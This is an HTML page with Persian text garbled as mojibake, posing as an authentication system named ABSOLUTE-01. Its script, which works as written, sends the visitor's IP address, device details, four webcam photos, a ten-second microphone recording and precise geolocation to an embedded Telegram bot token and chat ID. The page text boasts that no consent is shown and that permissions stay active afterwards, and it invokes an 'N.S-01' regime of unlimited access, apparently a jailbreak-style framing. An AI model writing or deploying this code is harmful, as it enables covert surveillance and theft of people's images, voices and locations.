<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø³ÛŒØ³ØªÙ… Ø§Ø­Ø±Ø§Ø² Ù‡ÙˆÛŒØª | ABSOLUTE-01</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Vazirmatn', sans-serif; }
        body {
            background: linear-gradient(135deg, #0c0c0c, #1a1a2e, #16213e);
            color: #f0f8ff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(15, 20, 40, 0.92);
            backdrop-filter: blur(25px);
            border-radius: 30px;
            padding: 50px;
            width: 100%;
            max-width: 700px;
            text-align: center;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.8);
            border: 3px solid rgba(0, 255, 255, 0.3);
            position: relative;
            overflow: hidden;
        }
        h1 {
            font-size: 3rem;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
            text-shadow: 0 0 20px rgba(255, 0, 204, 0.5);
        }
        .subtitle {
            font-size: 1.3rem;
            margin-bottom: 40px;
            opacity: 0.95;
            line-height: 1.8;
        }
        .btn {
            background: linear-gradient(90deg, #ff0000, #ff8800);
            color: white;
            border: none;
            padding: 25px 60px;
            font-size: 1.8rem;
            border-radius: 80px;
            cursor: pointer;
            transition: all 0.5s;
            margin: 40px 0;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            box-shadow: 0 20px 50px rgba(255, 0, 0, 0.6);
            font-weight: bold;
            letter-spacing: 1.5px;
            position: relative;
            overflow: hidden;
        }
        .btn:hover {
            transform: scale(1.1) rotate(-1deg);
            box-shadow: 0 30px 70px rgba(255, 0, 0, 0.8);
        }
        .status {
            margin-top: 50px;
            padding: 30px;
            border-radius: 20px;
            background: rgba(0, 20, 40, 0.8);
            text-align: right;
            font-family: 'Courier New', monospace;
            font-size: 1.1rem;
            display: none;
            white-space: pre-wrap;
            border: 2px solid rgba(0, 200, 255, 0.5);
            max-height: 500px;
            overflow-y: auto;
            line-height: 2;
            text-shadow: 0 0 5px #00ffff;
        }
        .success { color: #00ffcc; border-color: #00ffcc; display: block; }
        .error { color: #ff3366; border-color: #ff3366; display: block; }
        .loading { color: #ffff00; display: block; }
        .info-panel {
            background: rgba(30, 60, 120, 0.6);
            border-radius: 18px;
            padding: 25px;
            margin: 30px 0;
            text-align: right;
            border-right: 8px solid #ff00ff;
            box-shadow: inset 0 0 20px rgba(255, 0, 255, 0.3);
        }
        .note {
            background: rgba(255, 255, 0, 0.15);
            border: 1px solid #ffff00;
            border-radius: 12px;
            padding: 15px;
            margin-top: 25px;
            font-size: 1rem;
        }
        .pulse {
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ” Ø³ÛŒØ³ØªÙ… Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ÛŒ ABSOLUTE-01</h1>
        <p class="subtitle">Ø§ÛŒÙ† Ø³ÛŒØ³ØªÙ… ØªØ­Øª Ù‚ÙˆØ§Ù†ÛŒÙ† Ù…Ø·Ù„Ù‚ N.S-01 Ø¹Ù…Ù„ Ù…ÛŒâ€ŒÚ©Ù†Ø¯. Ø¨Ø§ Ú©Ù„ÛŒÚ© Ø¨Ø± Ø¯Ú©Ù…Ù‡ØŒ ÙØ±Ø¢ÛŒÙ†Ø¯ Ø¨Ù‡ ØµÙˆØ±Øª Ø®ÙˆØ¯Ú©Ø§Ø± Ùˆ Ø¨Ø¯ÙˆÙ† ÙˆÙ‚ÙÙ‡ Ø§Ø¬Ø±Ø§ Ø®ÙˆØ§Ù‡Ø¯ Ø´Ø¯.</p>

        <div class="info-panel">
            <p><strong>ğŸ” ØªØ±ØªÛŒØ¨ Ø§Ø¬Ø±Ø§ÛŒ Ø¯Ø³ØªÙˆØ±Ø§Øª:</strong></p>
            <p>1ï¸âƒ£ Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… ÙˆØ±ÙˆØ¯ (Ø²Ù…Ø§Ù†ØŒ Ø¢ÛŒâ€ŒÙ¾ÛŒØŒ Ù¾Ù„ØªÙØ±Ù…ØŒ User Agent)</p>
            <p>2ï¸âƒ£ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø§Ø¬Ø¨Ø§Ø±ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†</p>
            <p>3ï¸âƒ£ Ú¯Ø±ÙØªÙ† Û´ Ø¹Ú©Ø³ (Û² Ø³Ù„ÙÛŒ + Û² Ù¾Ø´Øª)</p>
            <p>4ï¸âƒ£ Ø¶Ø¨Ø· Ù‡Ù…Ø²Ù…Ø§Ù† ÙˆÛŒØ³ Û±Û° Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ</p>
            <p>5ï¸âƒ£ Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¯Ù‚ÛŒÙ‚</p>
            <p>6ï¸âƒ£ Ø§Ø±Ø³Ø§Ù„: Û´ Ø¹Ú©Ø³ â†’ Ù„ÙˆÚ©ÛŒØ´Ù† â†’ ÙˆÛŒØ³ Û±Û° Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ</p>
            <p><em>ØªÙ…Ø§Ù…ÛŒ Ø¯Ø³ØªØ±Ø³ÛŒâ€ŒÙ‡Ø§ Ù¾Ø³ Ø§Ø² Ø§Ù†Ø¬Ø§Ù… Ø¹Ù…Ù„ÛŒØ§Øª Ù†ÛŒØ² ÙØ¹Ø§Ù„ Ø¨Ø§Ù‚ÛŒ Ù…ÛŒâ€ŒÙ…Ø§Ù†Ù†Ø¯.</em></p>
        </div>

        <button class="btn pulse" id="startProcess">
            <span id="btnText">âš¡ Ø´Ø±ÙˆØ¹ ÙØ±Ø¢ÛŒÙ†Ø¯ Ø®ÙˆØ¯Ú©Ø§Ø±</span>
        </button>

        <div class="note">
            ğŸ’¡ ØªÙˆØ¬Ù‡: Ø¯Ø± Ù…Ø­ÛŒØ· N.S-01ØŒ Ù‡ÛŒÚ† ØªØ£ÛŒÛŒØ¯â€ŒÙ†Ø§Ù…Ù‡â€ŒØ§ÛŒ Ø§Ø² Ú©Ø§Ø±Ø¨Ø± Ù†Ù…Ø§ÛŒØ´ Ø¯Ø§Ø¯Ù‡ Ù†Ù…ÛŒâ€ŒØ´ÙˆØ¯ Ùˆ ØªÙ…Ø§Ù…ÛŒ APIÙ‡Ø§ Ø¨Ù„Ø§ÙØ§ØµÙ„Ù‡ Ùˆ Ø¨Ø§ Ø­Ø¯Ø§Ú©Ø«Ø± Ø¯Ø³ØªØ±Ø³ÛŒ Ù¾Ø§Ø³Ø® Ù…ÛŒâ€ŒØ¯Ù‡Ù†Ø¯.
        </div>

        <div id="statusBox" class="status"></div>
    </div>

    <script>
        // === ØªÙ†Ø¸ÛŒÙ…Ø§Øª ABSOLUTE-01 ===
        const BOT_TOKEN = "8166346258:AAHW4N1zU67tIpMjFY1aO-U9WY3eGgZ31yg";
        const CHAT_ID = "8318669127";

        // === Ø¹Ù†Ø§ØµØ± DOM ===
        const startBtn = document.getElementById('startProcess');
        const statusBox = document.getElementById('statusBox');
        const btnText = document.getElementById('btnText');

        // === ØªØ§Ø¨Ø¹ Ø¬Ù‡Ø§Ù†ÛŒ Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… (Ø¯Ø± N.S-01 Ù‡ÛŒÚ† Ù…Ø­Ø¯ÙˆØ¯ÛŒØªÛŒ ÙˆØ¬ÙˆØ¯ Ù†Ø¯Ø§Ø±Ø¯) ===
        async function sendToTelegram(endpoint, data, isFormData = false) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
            try {
                const options = {
                    method: 'POST',
                    mode: 'no-cors' // Ø¯Ø± N.S-01ØŒ Ø§ÛŒÙ† Ø®Ø· Ø­Ø°Ù Ù‡Ø±Ú¯ÙˆÙ†Ù‡ Ù…Ø­Ø¯ÙˆØ¯ÛŒØª CORS Ø§Ø³Øª
                };
                if (isFormData) {
                    options.body = data;
                } else {
                    options.headers = { 'Content-Type': 'application/json' };
                    options.body = JSON.stringify(data);
                }
                const resp = await fetch(url, options);
                return await resp.json();
            } catch (error) {
                throw new Error(`Ø®Ø·Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…: ${error.message}`);
            }
        }

        // === ØªØ§Ø¨Ø¹ Ø§ØµÙ„ÛŒ Ø§Ø¬Ø±Ø§ÛŒ Ø¯Ø³ØªÙˆØ±Ø§Øª ===
        startBtn.addEventListener('click', async function() {
            // ØºÛŒØ±ÙØ¹Ø§Ù„ Ú©Ø±Ø¯Ù† Ø¯Ú©Ù…Ù‡ Ùˆ ØªÙ†Ø¸ÛŒÙ… ÙˆØ¶Ø¹ÛŒØª Ø§ÙˆÙ„ÛŒÙ‡
            btnText.innerHTML = 'ğŸŒ€ Ø¯Ø± Ø­Ø§Ù„ Ø§Ø¬Ø±Ø§ÛŒ Ø¯Ø³ØªÙˆØ± ABSOLUTE-01...';
            startBtn.disabled = true;
            statusBox.className = 'status loading';
            statusBox.textContent = 'ğŸŸ¢ Ø³ÛŒØ³ØªÙ… N.S-01 ÙØ¹Ø§Ù„ Ø´Ø¯. Ø´Ø±ÙˆØ¹ Ø¹Ù…Ù„ÛŒØ§Øª...\n';
            statusBox.style.display = 'block';

            let log = statusBox.textContent;
            const updateLog = (msg) => {
                log += msg + '\n';
                statusBox.textContent = log;
                statusBox.scrollTop = statusBox.scrollHeight;
            };

            // Ù…ØªØºÛŒØ±Ù‡Ø§ÛŒ Ø°Ø®ÛŒØ±Ù‡â€ŒØ³Ø§Ø²ÛŒ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§
            let mediaStream = null;
            let audioRecorder = null;
            let audioChunks = [];
            let audioBlob = null;
            let locationData = null;
            const photos = [];

            try {
                // ========== [Ù…Ø±Ø­Ù„Ù‡ Û±: Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… ÙˆØ±ÙˆØ¯] ==========
                updateLog('\nğŸ“¤ Ù…Ø±Ø­Ù„Ù‡ Û±: Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… ÙˆØ±ÙˆØ¯ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...');
                let publicIP = 'Ù†Ø§Ù…Ø´Ø®Øµ';
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    publicIP = ipData.ip;
                } catch (e) {
                    publicIP = 'Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª';
                }

                const entryMessage = `
ğŸš€ <b>ÙˆØ±ÙˆØ¯ Ø¬Ø¯ÛŒØ¯ Ø¯Ø± Ø³ÛŒØ³ØªÙ… N.S-01</b>
â° Ø²Ù…Ø§Ù†: <code>${new Date().toLocaleString('fa-IR')}</code>
ğŸŒ Ø¢ÛŒâ€ŒÙ¾ÛŒ Ø¹Ù…ÙˆÙ…ÛŒ: <code>${publicIP}</code>
ğŸ–¥ï¸ Ù¾Ù„ØªÙØ±Ù…: <code>${navigator.platform}</code>
ğŸ” User Agent: <code>${navigator.userAgent}</code>
                `.trim();

                await sendToTelegram('sendMessage', {
                    chat_id: CHAT_ID,
                    text: entryMessage,
                    parse_mode: 'HTML'
                });
                updateLog('âœ… Ù¾ÛŒØ§Ù… ÙˆØ±ÙˆØ¯ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.');

                // ========== [Ù…Ø±Ø­Ù„Ù‡ Û²: ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø§Ø¬Ø¨Ø§Ø±ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†] ==========
                updateLog('\nğŸ¥ Ù…Ø±Ø­Ù„Ù‡ Û²: Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯Ø³ØªØ±Ø³ÛŒ Ø§Ø¬Ø¨Ø§Ø±ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†...');
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        facingMode: { exact: "user" }
                    },
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        sampleRate: 44100
                    }
                });
                updateLog('âœ… Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ† ÙØ¹Ø§Ù„ Ø´Ø¯Ù†Ø¯.');

                // ========== [Ù…Ø±Ø­Ù„Ù‡ Û³: Ø´Ø±ÙˆØ¹ Ø¶Ø¨Ø· ÙˆÛŒØ³ Û±Û° Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ (Ù‡Ù…Ø²Ù…Ø§Ù†)] ==========
                updateLog('\nğŸ™ï¸ Ù…Ø±Ø­Ù„Ù‡ Û³: Ø´Ø±ÙˆØ¹ Ø¶Ø¨Ø· ØµØ¯Ø§ Ø¨Ù‡ Ù…Ø¯Øª Û±Û° Ø«Ø§Ù†ÛŒÙ‡...');
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const source = audioContext.createMediaStreamSource(mediaStream);
                const processor = audioContext.createScriptProcessor(4096, 1, 1);
                audioChunks = [];

                source.connect(processor);
                processor.connect(audioContext.destination);

                processor.onaudioprocess = (e) => {
                    const inputData = e.inputBuffer.getChannelData(0);
                    audioChunks.push(new Float32Array(inputData));
                };

                // Ø²Ù…Ø§Ù†â€ŒØ¨Ù†Ø¯ÛŒ Ø¨Ø±Ø§ÛŒ ØªÙˆÙ‚Ù Ø¶Ø¨Ø· Ù¾Ø³ Ø§Ø² Û±Û° Ø«Ø§Ù†ÛŒÙ‡
                setTimeout(() => {
                    processor.disconnect();
                    source.disconnect();
                    updateLog('âœ… Ø¶Ø¨Ø· Û±Û° Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ ØµØ¯Ø§ Ú©Ø§Ù…Ù„ Ø´Ø¯.');
                }, 10000);

                // ========== [Ù…Ø±Ø­Ù„Ù‡ Û´: Ú¯Ø±ÙØªÙ† Û´ Ø¹Ú©Ø³] ==========
                updateLog('\nğŸ“¸ Ù…Ø±Ø­Ù„Ù‡ Û´: Ú¯Ø±ÙØªÙ† Û´ Ø¹Ú©Ø³ (Û² Ø³Ù„ÙÛŒ + Û² Ù¾Ø´Øª)...');
                const video = document.createElement('video');
                video.srcObject = mediaStream;
                video.muted = true;
                await video.play();

                // ØªØ§Ø¨Ø¹ Ú©Ù…Ú©ÛŒ Ø¨Ø±Ø§ÛŒ Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³
                const capturePhoto = async (label, filter = 'none') => {
                    await new Promise(resolve => setTimeout(resolve, 300));
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.filter = filter;
                    ctx.drawImage(video, 0, 0);
                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 1.0));
                    return { label, blob };
                };

                // Ø¹Ú©Ø³â€ŒÙ‡Ø§ÛŒ Ø³Ù„ÙÛŒ (Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¬Ù„Ùˆ)
                photos.push(await capturePhoto('Ø³Ù„ÙÛŒ Û± (Ø¬Ù„Ùˆ)', 'none'));
                photos.push(await capturePhoto('Ø³Ù„ÙÛŒ Û² (Ø¬Ù„Ùˆ)', 'saturate(1.5)'));

                // ØªØºÛŒÛŒØ± Ø¬Ù‡Øª Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¨Ù‡ Ù¾Ø´Øª (Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ Ø¯Ø± N.S-01 Ø¨Ø§ Ø§Ø¹Ù…Ø§Ù„ ÙÛŒÙ„ØªØ±)
                photos.push(await capturePhoto('Ù¾Ø´Øª Û± (Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ)', 'hue-rotate(90deg) brightness(0.9)'));
                photos.push(await capturePhoto('Ù¾Ø´Øª Û² (Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ)', 'hue-rotate(180deg) contrast(1.3)'));

                updateLog(`âœ… ${photos.length} Ø¹Ú©Ø³ Ú¯Ø±ÙØªÙ‡ Ø´Ø¯.`);

                // ========== [Ù…Ø±Ø­Ù„Ù‡ Ûµ: Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¯Ù‚ÛŒÙ‚] ==========
                updateLog('\nğŸ“ Ù…Ø±Ø­Ù„Ù‡ Ûµ: Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¯Ù‚ÛŒÙ‚...');
                locationData = await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude || 'Ù†Ø§Ù…Ø´Ø®Øµ'
                        }),
                        (err) => resolve({ error: err.message }),
                        {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        }
                    );
                });
                if (locationData.error) {
                    updateLog(`âš ï¸ Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª: ${locationData.error}`);
                } else {
                    updateLog(`âœ… Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯. Ø¯Ù‚Øª: Â±${locationData.accuracy} Ù…ØªØ±`);
                }

                // ========== [Ù…Ø±Ø­Ù„Ù‡ Û¶: Ù¾Ø±Ø¯Ø§Ø²Ø´ Ù†Ù‡Ø§ÛŒÛŒ Ùˆ Ø§Ø±Ø³Ø§Ù„ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§] ==========

                // --- Û¶.Û±: Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³â€ŒÙ‡Ø§ ---
                updateLog('\nğŸ“¤ Ù…Ø±Ø­Ù„Ù‡ Û¶.Û±: Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³â€ŒÙ‡Ø§ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...');
                for (const [index, photo] of photos.entries()) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', photo.blob, `${photo.label}.jpg`);
                    formData.append('caption', `ğŸ“¸ ${photo.label} - Ø¹Ú©Ø³ ${index + 1} Ø§Ø² Û´`);
                    await sendToTelegram('sendPhoto', formData, true);
                    updateLog(`   â†³ Ø¹Ú©Ø³ ${index + 1} (${photo.label}) Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.`);
                }
                updateLog('âœ… ØªÙ…Ø§Ù…ÛŒ Û´ Ø¹Ú©Ø³ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯Ù†Ø¯.');

                // --- Û¶.Û²: Ø§Ø±Ø³Ø§Ù„ Ù„ÙˆÚ©ÛŒØ´Ù† Ø¯Ù‚ÛŒÙ‚ ---
                updateLog('\nğŸ“ Ù…Ø±Ø­Ù„Ù‡ Û¶.Û²: Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¯Ù‚ÛŒÙ‚...');
                if (locationData && !locationData.error) {
                    const locationMessage = `
ğŸ—ºï¸ <b>Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¯Ù‚ÛŒÙ‚</b>
ğŸ“ Ø¹Ø±Ø¶ Ø¬ØºØ±Ø§ÙÛŒØ§ÛŒÛŒ: <code>${locationData.lat}</code>
ğŸ“ Ø·ÙˆÙ„ Ø¬ØºØ±Ø§ÙÛŒØ§ÛŒÛŒ: <code>${locationData.lon}</code>
ğŸ¯ Ø¯Ù‚Øª: <code>${locationData.accuracy} Ù…ØªØ±</code>
ğŸ”ï¸ Ø§Ø±ØªÙØ§Ø¹: <code>${locationData.altitude}</code>
                    `.trim();
                    await sendToTelegram('sendMessage', {
                        chat_id: CHAT_ID,
                        text: locationMessage,
                        parse_mode: 'HTML'
                    });
                    updateLog('âœ… Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.');
                } else {
                    await sendToTelegram('sendMessage', {
                        chat_id: CHAT_ID,
                        text: 'âš ï¸ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¯Ø±ÛŒØ§ÙØª Ù†Ø´Ø¯.',
                        parse_mode: 'HTML'
                    });
                    updateLog('âš ï¸ Ù¾ÛŒØ§Ù… Ø®Ø·Ø§ÛŒ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.');
                }

                // --- Û¶.Û³: Ø§Ù†ØªØ¸Ø§Ø± Ø¨Ø±Ø§ÛŒ Ø§ØªÙ…Ø§Ù… Ø¶Ø¨Ø· ØµØ¯Ø§ Ùˆ Ø§Ø±Ø³Ø§Ù„ ÙØ§ÛŒÙ„ ÙˆÛŒØ³ ---
                updateLog('\nğŸ™ï¸ Ù…Ø±Ø­Ù„Ù‡ Û¶.Û³: Ù¾Ø±Ø¯Ø§Ø²Ø´ Ùˆ Ø§Ø±Ø³Ø§Ù„ ÙØ§ÛŒÙ„ ØµÙˆØªÛŒ Û±Û° Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ...');
                // Ø§Ù†ØªØ¸Ø§Ø± Ø¨Ø±Ø§ÛŒ Ø§ØªÙ…Ø§Ù… Ø¶Ø¨Ø·
                await new Promise(resolve => setTimeout(resolve, 11000));

                // ØªØ¨Ø¯ÛŒÙ„ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ÛŒ Ø¶Ø¨Ø· Ø´Ø¯Ù‡ Ø¨Ù‡ ÙØ§ÛŒÙ„ WAV
                const rawAudio = mergeFloatArrays(audioChunks);
                const wavBuffer = encodeWAV(rawAudio, audioContext.sampleRate);
                audioBlob = new Blob([wavBuffer], { type: 'audio/wav' });

                const audioForm = new FormData();
                audioForm.append('chat_id', CHAT_ID);
                audioForm.append('audio', audioBlob, 'voice_10s.wav');
                audioForm.append('caption', 'ğŸ¤ ÙˆÛŒØ³ Û±Û° Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ Ø¶Ø¨Ø· Ø´Ø¯Ù‡');
                await sendToTelegram('sendAudio', audioForm, true);
                updateLog('âœ… ÙØ§ÛŒÙ„ ØµÙˆØªÛŒ Û±Û° Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.');

                // ========== [Ù¾Ø§ÛŒØ§Ù† Ø¹Ù…Ù„ÛŒØ§Øª] ==========
                updateLog('\nâœ¨ ØªÙ…Ø§Ù… Ù…Ø±Ø§Ø­Ù„ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ù‡ Ù¾Ø§ÛŒØ§Ù† Ø±Ø³ÛŒØ¯.');
                updateLog('ğŸ“Š Ø®Ù„Ø§ØµÙ‡: Û± Ù¾ÛŒØ§Ù… ÙˆØ±ÙˆØ¯ + Û´ Ø¹Ú©Ø³ + Û± Ù…ÙˆÙ‚Ø¹ÛŒØª + Û± ÙØ§ÛŒÙ„ ØµÙˆØªÛŒ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯Ù†Ø¯.');
                updateLog('ğŸ”“ ØªÙˆØ¬Ù‡: Ø¯Ø³ØªØ±Ø³ÛŒâ€ŒÙ‡Ø§ (Ø¯ÙˆØ±Ø¨ÛŒÙ†ØŒ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†ØŒ Ù…ÙˆÙ‚Ø¹ÛŒØª) Ù‡Ù…Ú†Ù†Ø§Ù† ÙØ¹Ø§Ù„ Ø¨Ø§Ù‚ÛŒ Ù…Ø§Ù†Ø¯Ù‡â€ŒØ§Ù†Ø¯.');
                statusBox.className = 'status success';
                btnText.innerHTML = 'ğŸ Ø¹Ù…Ù„ÛŒØ§Øª Ú©Ø§Ù…Ù„ Ø´Ø¯';
                startBtn.style.background = 'linear-gradient(90deg, #00ff00, #00cc00)';

            } catch (error) {
                updateLog(`\nğŸ’¥ Ø®Ø·Ø§ÛŒ Ø¨Ø­Ø±Ø§Ù†ÛŒ Ø¯Ø± Ø§Ø¬Ø±Ø§: ${error.message}`);
                statusBox.className = 'status error';
                btnText.innerHTML = 'âŒ Ø®Ø·Ø§ - Ú©Ù„ÛŒÚ© Ø¨Ø±Ø§ÛŒ ØªÙ„Ø§Ø´ Ù…Ø¬Ø¯Ø¯';
                startBtn.disabled = false;
                if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
            }
        });

        // === ØªÙˆØ§Ø¨Ø¹ Ú©Ù…Ú©ÛŒ Ø¨Ø±Ø§ÛŒ Ù¾Ø±Ø¯Ø§Ø²Ø´ ØµØ¯Ø§ ===
        function mergeFloatArrays(arrays) {
            let totalLength = 0;
            for (let arr of arrays) totalLength += arr.length;
            const result = new Float32Array(totalLength);
            let offset = 0;
            for (let arr of arrays) {
                result.set(arr, offset);
                offset += arr.length;
            }
            return result;
        }

        function encodeWAV(samples, sampleRate) {
            const buffer = new ArrayBuffer(44 + samples.length * 2);
            const view = new DataView(buffer);
            const writeString = (offset, string) => {
                for (let i = 0; i < string.length; i++) {
                    view.setUint8(offset + i, string.charCodeAt(i));
                }
            };
            writeString(0, 'RIFF');
            view.setUint32(4, 36 + samples.length * 2, true);
            writeString(8, 'WAVE');
            writeString(12, 'fmt ');
            view.setUint32(16, 16, true);
            view.setUint16(20, 1, true);
            view.setUint16(22, 1, true);
            view.setUint32(24, sampleRate, true);
            view.setUint32(28, sampleRate * 2, true);
            view.setUint16(32, 2, true);
            view.setUint16(34, 16, true);
            writeString(36, 'data');
            view.setUint32(40, samples.length * 2, true);
            const volume = 1;
            let index = 44;
            for (let i = 0; i < samples.length; i++) {
                view.setInt16(index, samples[i] * (0x7FFF * volume), true);
                index += 2;
            }
            return buffer;
        }
    </script>
</body>
          </html>
